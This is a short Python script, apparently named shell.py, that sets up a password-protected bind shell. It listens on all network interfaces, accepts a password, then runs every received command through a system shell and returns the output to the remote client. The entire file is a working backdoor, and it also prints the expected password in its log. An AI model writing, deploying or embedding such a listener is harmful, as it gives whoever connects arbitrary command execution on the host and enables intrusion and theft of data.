import socket
import subprocess
import os
import sys

RED     = "\033[91m"
GREEN   = "\033[92m"
RESET   = "\033[0m"

def handle_client(conn, addr, passwd):
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    try:
        conn.send(b"Password: ")

        # read in the password and compare it from argv1
        client_password = conn.recv(1024).decode().strip()
        print(f"[G] Expected: {passwd} | Got: {client_password}")

        if client_password != passwd:
            conn.send(b"Incorrect password.\n")
            conn.close()
            return

        conn.send(b"Correct!\n")
        cwd = os.getcwd()

        # open the shell
        while True:
            conn.send(f"{cwd}".encode())
            cmd = conn.recv(1024).decode().strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                break

            # for changing directories
            if cmd.startswith('cd '):
                path = cmd[3:].strip()
                try:
                    os.chdir(path)
                    cwd = os.getcwd()
                    conn.send(b"")

                # send errors back through the socket
                except Exception as e:
                    conn.send(f"cd: {str(e)}\n".encode())
                continue

            # for other commands, send the output back through the socket
            try:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for line in proc.stdout:
                    conn.send(line.encode())
                proc.wait()
            except Exception as e:
                conn.send(f"Error: {str(e)}\n".encode())

    except ConnectionResetError:
        print(f"[-] Connection lost from {addr[0]}:{addr[1]}")

    finally:
        conn.close()

def shell_server(passwd, port):
    host='0.0.0.0'
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(5)
        print(f"server started on {host}:{port}")

        while True:
            conn, addr = s.accept()
            handle_client(conn, addr, passwd)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 shell.py <password>")
        exit()

    passwd = sys.argv[1]
    port   = int(sys.argv[2])
    shell_server(passwd, port)
